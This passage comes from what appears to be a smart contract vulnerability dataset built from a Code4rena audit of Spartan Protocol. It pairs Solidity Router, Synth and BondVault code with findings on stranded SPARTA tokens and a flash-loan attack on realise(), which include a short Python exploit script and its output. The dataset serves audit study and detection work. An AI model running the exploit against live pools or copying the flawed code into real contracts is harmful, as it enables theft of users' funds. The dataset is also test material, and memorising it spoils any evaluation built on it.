_handleTransferOut(BASE, outputBase, _member); // Transfer SPARTA to user\n        }\n    }\n\n    // User removes liquidity asymetrically (one asset)\n    function removeLiquiditySingle(uint units, bool toBase, address token) external{\n        address _pool = iPOOLFACTORY(_DAO().POOLFACTORY()).getPool(token); // Get pool address\n        require(iPOOLFACTORY(_DAO().POOLFACTORY()).isPool(_pool) == true); // Pool must be valid\n        address _member = msg.sender; // Get user's address\n        iBEP20(_pool).transferFrom(_member, _pool, units); // Transfer LPs to pool\n        Pool(_pool).remove(); // Remove liquidity & tsf to ROUTER\n        address _token = token; // Get token address\n        if(token == address(0)){_token = WBNB;} // Handle BNB -> WBNB\n        if(toBase){\n            iBEP20(_token).transfer(_pool, iBEP20(_token).balanceOf(address(this))); // Transfer TOKEN to pool\n            Pool(_pool).swapTo(BASE, _member); // Swap TOKEN for SPARTA & tsf to user\n        } else {\n            iBEP20(BASE).transfer(_pool, iBEP20(BASE).balanceOf(address(this))); // Transfer SPARTA to pool\n            Pool(_pool).swap(_token); // Swap SPARTA for TOKEN & transfer to ROUTER\n            _handleTransferOut(token, iBEP20(_token).balanceOf(address(this)), _member); // Send TOKEN to user\n        } \n    }\n\n    //============================== Swapping Functions ====================================//\n    \n    // Swap SPARTA for TOKEN\n    function buyTo(uint amount, address token, address member) public {\n        address _pool = iPOOLFACTORY(_DAO().POOLFACTORY()).getPool(token); // Get the pool address\n        _handleTransferIn(BASE, amount, _pool); // Transfer SPARTA to pool\n        uint fee;\n        if(token != address(0)){\n            (, uint feey) = Pool(_pool).swapTo(token, member); // Swap SPARTA to TOKEN & tsf to user\n            fee = feey;\n        } else {\n            (uint outputAmount, uint feez) = Pool(_pool).swap(WBNB); // Swap SPARTA to WBNB\n            _handleTransferOut(token, outputAmount, member); // Unwrap to BNB & tsf to user\n            fee = feez;\n        }\n        getsDividend(_pool, fee); // Check for dividend & tsf it to pool\n    }\n\n    // Swap TOKEN for SPARTA\n    function sellTo(uint amount, address token, address member) public payable returns (uint){\n        address _pool = iPOOLFACTORY(_DAO().POOLFACTORY()).getPool(token); // Get pool address\n        _handleTransferIn(token, amount, _pool); // Transfer TOKEN to pool\n        (, uint fee) = Pool(_pool).swapTo(BASE, member); // Swap TOKEN to SPARTA & transfer to user\n        getsDividend(_pool, fee); // Check for dividend & tsf it to pool\n        return fee;\n    }\n\n    // User performs a simple swap (to -> from)\n    function swap(uint256 inputAmount, address fromToken, address toToken) external payable{\n        swapTo(inputAmount, fromToken, toToken, msg.sender);\n    }\n\n    // Contract checks which swap function the user will require\n    function swapTo(uint256 inputAmount, address fromToken, address toToken, address member) public payable{\n        require(fromToken != toToken); // Tokens must not be the same\n        if(fromToken == BASE){\n            buyTo(inputAmount, toToken, member); // Swap SPARTA to TOKEN & tsf to user\n        } else if(toToken == BASE) {\n            sellTo(inputAmount, fromToken, member); // Swap TOKEN to SPARTA & tsf to user\n        } else {\n            address _poolTo = iPOOLFACTORY(_DAO().POOLFACTORY()).getPool(toToken); // Get pool address\n            uint feey = sellTo(inputAmount, fromToken, _poolTo); // Swap TOKEN to SPARTA & tsf to pool\n            address _toToken = toToken;\n            if(toToken == address(0)){_toToken = WBNB;} // Handle BNB -> WBNB\n            (uint _zz, uint _feez) = Pool(_poolTo).swap(_toToken); // Swap SPARTA to TOKEN & tsf to ROUTER\n            uint fee = feey+(_feez); // Get total slip fees\n            getsDividend(_poolTo, fee); // Check for dividend & tsf it to pool\n            _handleTransferOut(toToken, _zz, member); // Transfer TOKEN to user\n        }\n    }\n\n    // Check if fee should generate a dividend & send it to the pool\n    function getsDividend(address _pool, uint fee) internal {\n        if(iPOOLFACTORY(_DAO().POOLFACTORY()).isCuratedPool(_pool) == true){\n            addTradeFee(fee); // Add fee to array for avgFee calcs etc\n            addDividend(_pool, fee); // Check and tsf dividend to pool\n        }\n    }\n\n    //============================== Token Transfer Functions ======================================//\n    \n    // Handle the transfer of assets into the pool\n    function _handleTransferIn(address _token, uint256 _amount, address _pool) internal returns(uint256 actual){\n        if(_amount > 0) {\n            if(_token == address(0)){\n                require((_amount == msg.value));\n                (bool success, ) = payable(WBNB).call{value: _amount}(\"\"); // Wrap BNB\n                require(success, \"!send\");\n                iBEP20(WBNB).transfer(_pool, _amount); // Transfer WBNB from ROUTER to pool\n                actual = _amount;\n            } else {\n                uint startBal = iBEP20(_token).balanceOf(_pool); // Get prior TOKEN balance of pool\n                iBEP20(_token).transferFrom(msg.sender, _pool, _amount); // Transfer TOKEN to pool\n                actual = iBEP20(_token).balanceOf(_pool)-(startBal); // Get received TOKEN amount\n            }\n        }\n    }\n\n    // Handle the transfer of assets out of the ROUTER\n    function _handleTransferOut(address _token, uint256 _amount, address _recipient) internal {\n        if(_amount > 0) {\n            if (_token == address(0)) {\n                iWBNB(WBNB).withdraw(_amount); // Unwrap WBNB to BNB\n                (bool success, ) = payable(_recipient).call{value:_amount}(\"\");  // Send BNB to recipient\n                require(success, \"!send\");\n            } else {\n                iBEP20(_token).transfer(_recipient, _amount); // Transfer TOKEN to recipient\n            }\n        }\n    }\n\n    //================================ Swap Synths ========================================//\n    \n    // Swap TOKEN to Synth\n    function swapAssetToSynth(uint inputAmount, address fromToken, address toSynth) external payable {\n        require(fromToken != toSynth); // Tokens must not be the same\n        address _synthLayer1 = iSYNTH(toSynth).LayerONE(); // Get underlying token's address\n        address _pool = iPOOLFACTORY(_DAO().POOLFACTORY()).getPool(_synthLayer1); // Get relevant pool address\n        if(fromToken != BASE){\n            sellTo(inputAmount, fromToken, address(this)); // Swap TOKEN to SPARTA & tsf to ROUTER\n            iBEP20(BASE).transfer(_pool, iBEP20(BASE).balanceOf(address(this))); // Transfer SPARTA from ROUTER to pool\n        } else {\n            iBEP20(BASE).transferFrom(msg.sender, _pool, inputAmount); // Transfer SPARTA from ROUTER to pool\n        }\n        (, uint fee) = Pool(_pool).mintSynth(toSynth, msg.sender); // Mint synths & tsf to user\n        getsDividend(_pool, fee); // Check and tsf dividend to pool\n    }\n   \n    // Swap Synth to TOKEN\n    function swapSynthToAsset(uint inputAmount, address fromSynth, address toToken) external {\n        require(fromSynth != toToken); // Tokens must not be the same\n        address _synthINLayer1 = iSYNTH(fromSynth).LayerONE(); // Get synth's underlying token's address\n        address _poolIN = iPOOLFACTORY(_DAO().POOLFACTORY()).getPool(_synthINLayer1); // Get synth's relevant pool address\n        address _pool = iPOOLFACTORY(_DAO().POOLFACTORY()).getPool(toToken); // Get TOKEN's relevant pool address\n        iBEP20(fromSynth).transferFrom(msg.sender, _poolIN, inputAmount); // Transfer synth from user to pool\n        uint outputAmount; uint fee;\n        if(toToken == BASE){\n            Pool(_poolIN).burnSynth(fromSynth, msg.sender); // Swap Synths for SPARTA & tsf to user\n        } else {\n            (outputAmount,fee) = Pool(_poolIN).burnSynth(fromSynth, address(this)); // Swap Synths to SPARTA & tsf to ROUTER\n            if(toToken != address(0)){\n                (, uint feey) = Pool(_pool).swapTo(toToken, msg.sender); // Swap SPARTA to TOKEN & transfer to user\n                fee = feey + fee;\n            } else {\n                (uint outputAmountY, uint feez) = Pool(_pool).swap(WBNB); // Swap SPARTA to WBNB & tsf to ROUTER\n                _handleTransferOut(toToken, outputAmountY, msg.sender); // Unwrap to BNB & tsf to user\n                fee = feez + fee;\n            }\n        }\n        getsDividend(_pool, fee); // Check and tsf dividend to pool\n    }\n    \n    //============================= Token Dividends / Curated Pools =================================//\n    \n    // Calculate the Dividend and transfer it to the pool\n    function addDividend(address _pool, uint256 _fees) internal {\n        if(!(normalAverageFee == 0)){\n            uint reserve = iBEP20(BASE).balanceOf(_DAO().RESERVE()); // Get SPARTA balance in the RESERVE contract\n            if(!(reserve == 0)){\n                uint dailyAllocation = (reserve / eraLength) / maxTrades; // Calculate max dividend\n                uint numerator = _fees * dailyAllocation;\n                uint feeDividend = numerator / (_fees + normalAverageFee); // Calculate actual dividend\n                revenueDetails(feeDividend, _pool); // Add to revenue metrics\n                iRESERVE(_DAO().RESERVE()).grantFunds(feeDividend, _pool); // Transfer dividend from RESERVE to POOL\n                Pool(_pool).sync(); // Sync the pool balances to attribute the dividend to the existing LPers\n            }\n        }\n    }\n\n    // Add fee to feeArray, used to calculate normalAverageFee\n    function addTradeFee(uint _fee) internal {\n        uint totalTradeFees = 0;\n        uint arrayFeeLength = feeArray.length;\n        if(arrayFeeLength < arrayFeeSize){\n            feeArray.push(_fee); // Build array until it is == arrayFeeSize\n        } else {\n            addFee(_fee); // If array is required length; shift in place of oldest item\n            for(uint i = 0; i < arrayFeeSize; i++){\n                totalTradeFees = totalTradeFees + feeArray[i]; // NET sum of feeArray\n            }\n        }\n        normalAverageFee = totalTradeFees / arrayFeeSize; // Calc average fee\n    }\n\n    // Shift out oldest fee item and add newest\n    function addFee(uint _fee) internal {\n        uint n = feeArray.length; // 20\n        for (uint i = n - 1; i > 0; i--) {\n            feeArray[i] = feeArray[i - 1];\n        }\n        feeArray[0] = _fee;\n    }\n\n    function revenueDetails(uint _fees, address _pool) internal {\n        if(lastMonth == 0){\n            lastMonth = block.timestamp;\n        }\n        if(block.timestamp <= lastMonth + 2592000){ // 30 days\n            mapAddress_30DayDividends[_pool] = mapAddress_30DayDividends[_pool] + _fees;\n        } else {\n            lastMonth = block.timestamp;\n            mapAddress_Past30DayPoolDividends[_pool] = mapAddress_30DayDividends[_pool];\n            mapAddress_30DayDividends[_pool] = 0;\n            mapAddress_30DayDividends[_pool] = mapAddress_30DayDividends[_pool] + _fees;\n        }\n    }\n\n    function stringToBytes(string memory s) external pure returns (bytes memory){\n        return bytes(s);\n    }\n\n    function isEqual(bytes memory part1, bytes memory part2) external pure returns(bool equal){\n        if(sha256(part1) == sha256(part2)){\n            return true;\n        }\n    }\n    \n    //======================= Change Dividend Variables ===========================//\n\n    function changeArrayFeeSize(uint _size) external onlyDAO {\n        arrayFeeSize = _size;\n        delete feeArray;\n    }\n\n    function changeMaxTrades(uint _maxtrades) external onlyDAO {\n        maxTrades = _maxtrades;\n    }\n\n    function changeEraLength(uint _eraLength) external onlyDAO {\t\n        eraLength = _eraLength;\t\n    }\n\n    //================================== Helpers =================================//\n\n    function currentPoolRevenue(address pool) external view returns(uint256) {\n        return mapAddress_30DayDividends[pool];\n    }\n\n    function pastPoolRevenue(address pool) external view returns(uint256) {\n        return mapAddress_Past30DayPoolDividends[pool];\n    }\n}\n\n",
        "CodeNames": [
            "BondVault.sol",
            "Pool.sol",
            "Dao.sol",
            "Router.sol"
        ],
        "VulnerabilityDesc": [
            {
                "Name": "H-04",
                "Location": [
                    "swap(BASE)",
                    "swapTo()",
                    "removeLiquiditySingle()",
                    "_member",
                    "_token"
                ],
                "Type": " Members lose SPARTA tokens in  removeLiquiditySingle() ",
                "Description": "\nWhen a member calls removeLiquiditySingle() requesting only SPARTA in return, i.e. toBASE = true, the LP tokens are transferred to the Pool to withdraw the constituent SPARTA and TOKENs back to the Router. The withdrawn TOKENs are then transferred back to the Pool to convert to SPARTA and directly transferred to the member from the Pool. However, the member\u2019s SPARTA are left behind in the Router instead of being returned along with converted SPARTA from the Pool.\n\nIn other words, the _member's BASE SPARTA tokens that were removed from the Pool along with the TOKENs are never sent back to the _member because the _token's transferred to the Pool are converted to SPARTA and only those are sent back to member directly from the Pool via swapTo().\n\nThis effectively results in member losing the SPARTA component of their Pool LP tokens which get left behind in the Router and are possibly claimed by future transactions that remove SPARTA from Router.\n\nLPs sent to Pool(https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Router.sol#L121), SPARTA and TOKENs withdrawn from Pool to Router(https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Router.sol#L122), TOKENs from Router sent to Pool(https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Router.sol#L126), and TOKENs in Pool converted to BASE SPARTA and sent to member directly from the Pool(https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Router.sol#L127).\n\nRecommend:\n1. BASE SPARTA should also be transferred to the Pool before swapTo() so they get sent to the member along with the converted TOKENs via swapTo()\n2. Use swap(BASE) instead of swapTo() so that TOKENs are swapped for BASE SPARTA in Pool and sent back to ROUTER. Then send all the SPARTA from ROUTER to member.\n\nverifyfirst (Spartan) confirmed(https://github.com/code-423n4/2021-07-spartan-findings/issues/133#issuecomment-884607584):\n  This bug was missed in a last minute edit before pushing to code423n4, wouldn't have made it past testNet testing.\n However, it is a good find.\n\n\n",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity 0.8.3;\nimport \"./Pool.sol\";  \nimport \"./interfaces/iPOOLFACTORY.sol\";\n\ncontract Synth is iBEP20 {\n    address public BASE;\n    address public LayerONE; // Underlying relevant layer1 token\n    uint public genesis;\n    address public DEPLOYER;\n\n    string _name; string _symbol;\n    uint8 public override decimals; uint256 public override totalSupply;\n\n    mapping(address => uint) private _balances;\n    mapping(address => mapping(address => uint)) private _allowances;\n    mapping(address => uint) public mapSynth_LPBalance;\n    mapping(address => uint) public mapSynth_LPDebt;\n   \n    function _DAO() internal view returns(iDAO) {\n        return iBASE(BASE).DAO();\n    }\n    \n    // Restrict access\n    modifier onlyDAO() {\n        require(msg.sender == DEPLOYER, \"!DAO\");\n        _;\n    }\n\n    // Restrict access\n    modifier onlyPool() {\n        require(iPOOLFACTORY(_DAO().POOLFACTORY()).isCuratedPool(msg.sender) == true, \"!curated\");\n        _;\n    }\n    \n    constructor (address _base, address _token) {\n        BASE = _base;\n        LayerONE = _token;\n        string memory synthName = \"-SpartanProtocolSynthetic\";\n        string memory synthSymbol = \"-SPS\";\n        _name = string(abi.encodePacked(iBEP20(_token).name(), synthName));\n        _symbol = string(abi.encodePacked(iBEP20(_token).symbol(), synthSymbol));\n        decimals = iBEP20(_token).decimals();\n        DEPLOYER = msg.sender;\n        genesis = block.timestamp;\n    }\n\n    //========================================iBEP20=========================================//\n\n    function name() external view override returns (string memory) {\n        return _name;\n    }\n\n    function symbol() external view override returns (string memory) {\n        return _symbol;\n    }\n\n    function balanceOf(address account) public view override returns (uint256) {\n        return _balances[account];\n    }\n\n    function allowance(address owner, address spender) public view virtual override returns (uint256) {\n        return _allowances[owner][spender];\n    }\n\n    // iBEP20 Transfer function\n    function transfer(address recipient, uint256 amount) external virtual override returns (bool) {\n        _transfer(msg.sender, recipient, amount);\n        return true;\n    }\n\n    // iBEP20 Approve, change allowance functions\n    function approve(address spender, uint256 amount) external virtual override returns (bool) {\n        _approve(msg.sender, spender, amount);\n        return true;\n    }\n\n    function increaseAllowance(address spender, uint256 addedValue) external virtual returns (bool) {\n        _approve(msg.sender, spender, _allowances[msg.sender][spender]+(addedValue));\n        return true;\n    }\n\n    function decreaseAllowance(address spender, uint256 subtractedValue) external virtual returns (bool) {\n        uint256 currentAllowance = _allowances[msg.sender][spender];\n        require(currentAllowance >= subtractedValue, \"!approval\");\n        _approve(msg.sender, spender, currentAllowance - subtractedValue);\n        return true;\n    }\n\n    function _approve(address owner, address spender, uint256 amount) internal virtual {\n        require(owner != address(0), \"!owner\");\n        require(spender != address(0), \"!spender\");\n        if (_allowances[owner][spender] < type(uint256).max) { // No need to re-approve if already max\n            _allowances[owner][spender] = amount;\n            emit Approval(owner, spender, amount);\n        }\n    }\n    \n    // iBEP20 TransferFrom function\n    function transferFrom(address sender, address recipient, uint256 amount) external virtual override returns (bool) {\n        _transfer(sender, recipient, amount);\n        // Unlimited approval (saves an SSTORE)\n        if (_allowances[sender][msg.sender] < type(uint256).max) {\n            uint256 currentAllowance = _allowances[sender][msg.sender];\n            require(currentAllowance >= amount, \"!approval\");\n            _approve(sender, msg.sender, currentAllowance - amount);\n        }\n        return true;\n    }\n\n    //iBEP677 approveAndCall\n    function approveAndCall(address recipient, uint amount, bytes calldata data) external returns (bool) {\n        _approve(msg.sender, recipient, type(uint256).max); // Give recipient max approval\n        iBEP677(recipient).onTokenApproval(address(this), amount, msg.sender, data); // Amount is passed thru to recipient\n        return true;\n    }\n\n    //iBEP677 transferAndCall\n    function transferAndCall(address recipient, uint amount, bytes calldata data) external returns (bool) {\n        _transfer(msg.sender, recipient, amount);\n        iBEP677(recipient).onTokenTransfer(address(this), amount, msg.sender, data); // Amount is passed thru to recipient \n        return true;\n    }\n\n    // Internal transfer function\n    function _transfer(address sender, address recipient, uint256 amount) internal virtual {\n        require(sender != address(0), \"!sender\");\n        uint256 senderBalance = _balances[sender];\n        require(senderBalance >= amount, \"!balance\");\n        _balances[sender] -= amount;\n        _balances[recipient] += amount;\n        emit Transfer(sender, recipient, amount);\n    }\n\n    // Internal mint (upgrading and daily emissions)\n    function _mint(address account, uint256 amount) internal virtual {\n        require(account != address(0), \"!account\");\n        totalSupply += amount;\n        _balances[account] += amount;\n        emit Transfer(address(0), account, amount);\n    }\n\n    // Burn supply\n    function burn(uint256 amount) external virtual override {\n        _burn(msg.sender, amount);\n    }\n\n    function burnFrom(address account, uint256 amount) external virtual {  \n        uint256 decreasedAllowance = allowance(account, msg.sender) - (amount);\n        _approve(account, msg.sender, decreasedAllowance); \n        _burn(account, amount);\n    }\n\n    function _burn(address account, uint256 amount) internal virtual {\n        require(account != address(0), \"!account\");\n        require(_balances[account] >= amount, \"!balance\");\n        _balances[account] -= amount;\n        totalSupply -= amount;\n        emit Transfer(account, address(0), amount);\n    }\n\n    //==================================== SYNTH FUNCTIONS =================================//\n\n    // Handle received LP tokens and mint Synths\n    function mintSynth(address member, uint amount) external onlyPool returns (uint syntheticAmount){\n        uint lpUnits = _getAddedLPAmount(msg.sender); // Get the received LP units\n        mapSynth_LPDebt[msg.sender] += amount; // Increase debt by synth amount\n        mapSynth_LPBalance[msg.sender] += lpUnits; // Increase lp balance by LPs received\n        _mint(member, amount); // Mint the synths & tsf to user\n        return amount;\n    }\n    \n    // Handle received Synths and burn the LPs and Synths\n    function burnSynth() external returns (bool){\n        uint _syntheticAmount = balanceOf(address(this)); // Get the received synth units\n        uint _amountUnits = (_syntheticAmount * mapSynth_LPBalance[msg.sender]) / mapSynth_LPDebt[msg.sender]; // share = amount * part/total\n        mapSynth_LPBalance[msg.sender] -= _amountUnits; // Reduce lp balance\n        mapSynth_LPDebt[msg.sender] -= _syntheticAmount; // Reduce debt by synths being burnt\n        if(_amountUnits > 0){\n            _burn(address(this), _syntheticAmount); // Burn the synths\n            Pool(msg.sender).burn(_amountUnits); // Burn the LP tokens\n        }\n        return true;\n    }\n\n    // Burn LPs to if their value outweights the synths supply value (Ensures incentives are funnelled to existing LPers)\n    function realise(address pool) external {\n        uint baseValueLP = iUTILS(_DAO().UTILS()).calcLiquidityHoldings(mapSynth_LPBalance[pool], BASE, pool); // Get the SPARTA value of the LP tokens\n        uint baseValueSynth = iUTILS(_DAO().UTILS()).calcActualSynthUnits(mapSynth_LPDebt[pool], address(this)); // Get the SPARTA value of the synths\n        if(baseValueLP > baseValueSynth){\n            uint premium = baseValueLP - baseValueSynth; // Get the premium between the two values\n            if(premium > 10**18){\n                uint premiumLP = iUTILS(_DAO().UTILS()).calcLiquidityUnitsAsym(premium, pool); // Get the LP value of the premium\n                mapSynth_LPBalance[pool] -= premiumLP; // Reduce the LP balance\n                Pool(pool).burn(premiumLP); // Burn the premium of the LP tokens\n            }\n        }\n    }\n\n    // Check the received token amount\n    function _handleTransferIn(address _token, uint256 _amount) internal returns(uint256 _actual){\n        if(_amount > 0) {\n            uint startBal = iBEP20(_token).balanceOf(address(this)); // Get existing balance\n            iBEP20(_token).transferFrom(msg.sender, address(this), _amount); // Transfer tokens in\n            _actual = iBEP20(_token).balanceOf(address(this)) - startBal; // Calculate received amount\n        }\n        return _actual;\n    }\n\n    // Check the received LP tokens amount\n    function _getAddedLPAmount(address _pool) internal view returns(uint256 _actual){\n        uint _lpCollateralBalance = iBEP20(_pool).balanceOf(address(this)); // Get total balance held\n        if(_lpCollateralBalance > mapSynth_LPBalance[_pool]){\n            _actual = _lpCollateralBalance - mapSynth_LPBalance[_pool]; // Get received amount\n        } else {\n            _actual = 0;\n        }\n        return _actual;\n    }\n\n    function getmapAddress_LPBalance(address pool) external view returns (uint){\n        return mapSynth_LPBalance[pool];\n    }\n\n    function getmapAddress_LPDebt(address pool) external view returns (uint){\n        return mapSynth_LPDebt[pool];\n    }\n}\n\n\n",
        "CodeNames": [
            "Synth.sol"
        ],
        "VulnerabilityDesc": [
            {
                "Name": "H-05",
                "Location": [
                    "python\nflashloan_amount = init_amount\nuser = w3.eth.accounts[0]\nmarked_token.functions.transfer(user, flashloan_amount).transact()\nmarked_token.functions.transfer(token_pool.address, flashloan_amount).transact({'from': user})\ntoken_pool.functions.addForMember(user).transact({'from': user})\nreceived_lp = token_pool.functions.balanceOf(user).call()\nsynth_balance_before_realise = token_synth.functions.mapSynth_LPBalance(token_pool.address).call()\ntoken_synth.functions.realise(token_pool.address).transact()\ntoken_pool.functions.transfer(token_pool.address, received_lp).transact({'from': user})\ntoken_pool.functions.removeForMember(user).transact({'from': user})\ntoken_synth.functions.realise(token_pool.address).transact()\nsynth_balance_after_realise = token_synth.functions.mapSynth_LPBalance(token_pool.address).call()\nprint('synth_lp_balance_after_realise', synth_balance_after_realise)\nprint('synth_lp_balance_before_realise', synth_balance_before_realise)\n\n",
                    "\nsynth_balance_after_realise 1317859964829313908162\nsynth_balance_before_realise 2063953488372093023256\n"
                ],
                "Type": " Synth  realise  is vulnerable to flash loan attacks",
                "Description": "\nSynth realise function calculates baseValueLP and baseValueSynth base on AMM spot price which is vulnerable to flash loan attack. Synth's lp is subject to realise whenever the AMM ratio is different than Synth's debt ratio.\n\nThe attack does not necessarily require a flash loan. A big whale of the lp token holders could keep calling realise by shifting token ratio of AMM pool back and forth.\n\nThe vulnerability is located at Synth.sol L187-L199(https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Synth.sol#L187-L199). Where the formula here(https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Utils.sol#L114-L126) is dangerous.\n\nHere's a script for conducting flashloan attack:\npython\nflashloan_amount = init_amount\nuser = w3.eth.accounts[0]\nmarked_token.functions.transfer(user, flashloan_amount).transact()\nmarked_token.functions.transfer(token_pool.address, flashloan_amount).transact({'from': user})\ntoken_pool.functions.addForMember(user).transact({'from': user})\nreceived_lp = token_pool.functions.balanceOf(user).call()\nsynth_balance_before_realise = token_synth.functions.mapSynth_LPBalance(token_pool.address).call()\ntoken_synth.functions.realise(token_pool.address).transact()\ntoken_pool.functions.transfer(token_pool.address, received_lp).transact({'from': user})\ntoken_pool.functions.removeForMember(user).transact({'from': user})\ntoken_synth.functions.realise(token_pool.address).transact()\nsynth_balance_after_realise = token_synth.functions.mapSynth_LPBalance(token_pool.address).call()\nprint('synth_lp_balance_after_realise', synth_balance_after_realise)\nprint('synth_lp_balance_before_realise', synth_balance_before_realise)\n\n\nOutput:\n\nsynth_balance_after_realise 1317859964829313908162\nsynth_balance_before_realise 2063953488372093023256\n\n\nCalculating Lp token's value base on AMM protocol is known to be dangerous.\nThere are a few steps that might solve the issue:\n1. calculate token's price from a reliable source.  Implement a TWAP oracle or uses chainlink oracle.\n2. calculate lp token value based on anti-flashloan formula.  Alpha finance's formula is a good reference: https://blog.alphafinance.io/fair-lp-token-pricing\n\nverifyfirst (Spartan) confirmed and disagreed with severity(https://github.com/code-423n4/2021-07-spartan-findings/issues/40#issuecomment-883856664):\n  A proposal has been suggested to limit the use of realise() for a DAO proposal. This will allow only liquidity providers to choose the outcome of a function that directly affects them.\n\n\n\n",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity 0.8.3;\nimport \"./interfaces/iBEP20.sol\";\nimport \"./interfaces/iDAO.sol\";\nimport \"./interfaces/iBASE.sol\";\nimport \"./interfaces/iUTILS.sol\";\nimport \"./interfaces/iROUTER.sol\";\nimport \"./interfaces/iPOOL.sol\";\nimport \"./interfaces/iPOOLFACTORY.sol\";\n\ncontract BondVault {\n    address public BASE;\n    address public DEPLOYER;\n    uint256 public totalWeight;\n    bool private bondRelease;\n    address [] public arrayMembers;\n\n    struct ListedAssets {\n        bool isListed;\n        address[] members;\n        mapping(address => bool) isMember;\n        mapping(address => uint256) bondedLP;\n        mapping(address => uint256) claimRate;\n        mapping(address => uint256) lastBlockTime;\n    }\n    struct MemberDetails {\n        bool isMember;\n        uint256 bondedLP;\n        uint256 claimRate;\n        uint256 lastBlockTime;\n    }\n\n    mapping(address => ListedAssets) public mapBondAsset_memberDetails;\n    mapping(address => uint256) private mapMember_weight; // Value of users weight (scope: user)\n    mapping(address => mapping(address => uint256)) private mapMemberPool_weight; // Value of users weight (scope: pool)\n\n    constructor (address _base) {\n        BASE = _base;\n        DEPLOYER = msg.sender;\n        bondRelease = false;\n    }\n\n    // Restrict access\n    modifier onlyDAO() {\n        require(msg.sender == _DAO().DAO() || msg.sender == DEPLOYER);\n        _;\n    }\n\n    // Can purge deployer once DAO is stable and final\n    function purgeDeployer() public onlyDAO {\n        DEPLOYER = address(0);\n    }\n\n    // Get the current DAO address as reported by the BASE contract\n    function _DAO() internal view returns(iDAO) {\n        return iBASE(BASE).DAO();\n    }\n\n    // Deposit LPs in the BondVault for a user (Called from DAO)\n    function depositForMember(address asset, address member, uint LPS) external onlyDAO returns(bool){\n        if(!mapBondAsset_memberDetails[asset].isMember[member]){\n            mapBondAsset_memberDetails[asset].isMember[member] = true; // Register user as member (scope: user -> asset)\n            arrayMembers.push(member); // Add user to member array (scope: vault)\n            mapBondAsset_memberDetails[asset].members.push(member); // Add user to member array (scope: user -> asset)\n        }\n        if(mapBondAsset_memberDetails[asset].bondedLP[member] != 0){\n            claimForMember(asset, member); // Force claim if member has an existing remainder\n        }\n        mapBondAsset_memberDetails[asset].bondedLP[member] += LPS; // Add new deposit to users remainder\n        mapBondAsset_memberDetails[asset].lastBlockTime[member] = block.timestamp; // Set lastBlockTime to current time\n        mapBondAsset_memberDetails[asset].claimRate[member] = mapBondAsset_memberDetails[asset].bondedLP[member] / iDAO(_DAO().DAO()).bondingPeriodSeconds(); // Set claim rate per second\n        increaseWeight(asset, member); // Update user's weight\n        return true;\n    }\n\n    // Increase user's weight in the BondVault\n    function increaseWeight(address asset, address member) internal{\n        address pool = iPOOLFACTORY(_DAO().POOLFACTORY()).getPool(asset); // Get pool address\n        if (mapMemberPool_weight[member][pool] > 0) {\n            totalWeight -= mapMemberPool_weight[member][pool]; // Remove user weight from totalWeight (scope: vault)\n            mapMember_weight[member] -= mapMemberPool_weight[member][pool]; // Remove user weight from totalWeight (scope: user)\n            mapMemberPool_weight[member][pool] = 0; // Zero out user weight (scope: user -> pool)\n        }\n        uint256 weight = iUTILS(_DAO().UTILS()).getPoolShareWeight(asset, mapBondAsset_memberDetails[asset].bondedLP[member]); // Calculate user's bonded weight\n        mapMemberPool_weight[member][pool] = weight; // Set new weight (scope: user -> pool)\n        mapMember_weight[member] += weight; // Add new weight to totalWeight (scope: user)\n        totalWeight += weight; // Add new weight to totalWeight (scope: vault)\n    }\n\n    // Calculate the user's current available claim amount\n    function calcBondedLP(address member, address asset) public view returns (uint claimAmount){ \n        if(mapBondAsset_memberDetails[asset].isMember[member]){\n            uint256 _secondsSinceClaim = block.timestamp - mapBondAsset_memberDetails[asset].lastBlockTime[member]; // Get seconds passed since last claim\n            uint256 rate = mapBondAsset_memberDetails[asset].claimRate[member]; // Get user's claim rate\n            claimAmount = _secondsSinceClaim * rate; // Set claim amount\n            if(claimAmount >= mapBondAsset_memberDetails[asset].bondedLP[member] || bondRelease){\n                claimAmount = mapBondAsset_memberDetails[asset].bondedLP[member]; // If final claim; set claimAmount as remainder\n            }\n            return claimAmount;\n        }\n    }\n\n    // Perform a claim of the users's current available claim amount\n    function claimForMember(address asset, address member) public onlyDAO returns (bool){\n        require(mapBondAsset_memberDetails[asset].bondedLP[member] > 0, '!bonded'); // They must have remaining unclaimed LPs\n        require(mapBondAsset_memberDetails[asset].isMember[member], '!member'); // They must be a member (scope: user -> asset)\n        uint256 _claimable = calcBondedLP(member, asset); // Get the current claimable amount\n        address _pool = iPOOLFACTORY(_DAO().POOLFACTORY()).getPool(asset); // Get the pool address\n        mapBondAsset_memberDetails[asset].lastBlockTime[member] = block.timestamp; // Set lastBlockTime to current time\n        mapBondAsset_memberDetails[asset].bondedLP[member] -= _claimable; // Remove the claim amount from the user's remainder\n        if(_claimable == mapBondAsset_memberDetails[asset].bondedLP[member]){\n            mapBondAsset_memberDetails[asset].claimRate[member] = 0; // If final claim; zero-out their claimRate\n        }\n        decreaseWeight(asset, member); // Update user's weight\n        iBEP20(_pool).transfer(member, _claimable); // Send claim amount to user\n        return true;\n    }\n\n    // Decrease user's weight in the BondVault\n    function decreaseWeight(address asset, address member) internal {\n        address _pool = iPOOLFACTORY(_DAO().POOLFACTORY()).getPool(asset); // Get pool address\n        totalWeight -= mapMemberPool_weight[member][_pool]; // Remove user weight from totalWeight (scope: vault)\n        mapMember_weight[member] -= mapMemberPool_weight[member][_pool]; // Remove user weight from totalWeight (scope: user)\n        mapMemberPool_weight[member][_pool] = 0; // Zero out user weight (scope: user -> pool)\n        uint256 weight = iUTILS(_DAO().UTILS()).getPoolShareWeight(asset, mapBondAsset_memberDetails[asset].bondedLP[member]); // Calculate user's bonded weight\n        mapMemberPool_weight[member][_pool] = weight; // Set new weight (scope: user -> pool)\n        mapMember_weight[member] += weight; // Add new weight to totalWeight (scope: user)\n        totalWeight += weight; // // Add new weight to totalWeight (scope: vault)\n    }\n\n    // Get the total 